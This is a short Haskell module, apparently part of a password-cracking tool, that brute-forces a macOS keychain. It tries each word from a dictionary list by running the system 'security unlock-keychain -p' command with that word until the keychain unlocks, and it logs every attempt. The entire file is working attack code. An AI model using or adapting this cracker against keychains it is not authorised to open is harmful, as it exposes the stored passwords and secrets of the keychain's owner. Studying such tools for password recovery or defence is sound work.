module PWCrack.AttackMacOsXKeyChain(attackMacOsXKeyChain) where

import qualified Data.Text as T
import System.Process
import System.Exit

import PWCrack.Dictionaries

attackMacOsXKeyChain :: FilePath -> IO (Maybe T.Text)
attackMacOsXKeyChain keychain =
  checkPasswords generateListOfPasswords
 where
  checkPasswords :: [T.Text] -> IO (Maybe T.Text)
  checkPasswords [] = return Nothing
  checkPasswords (password : passwords) = do
    foundPassword <- testPassword keychain password
    if foundPassword
      then return $ Just password
      else checkPasswords passwords



testPassword :: FilePath -> T.Text -> IO Bool
testPassword keychain password = do
  putStrLn $ "try " ++ passwordString
  (exitCode, stdout , stderr) <- readProcessWithExitCode security arguments standardInput
  putStrLn $ show exitCode
  putStrLn stdout
  putStrLn stderr
  case exitCode of
    ExitSuccess   -> return True
    ExitFailure _ -> return False
 where
  security = "security"
  arguments = ["unlock-keychain", "-p", passwordString , keychain]
  standardInput = ""
  passwordString = T.unpack password

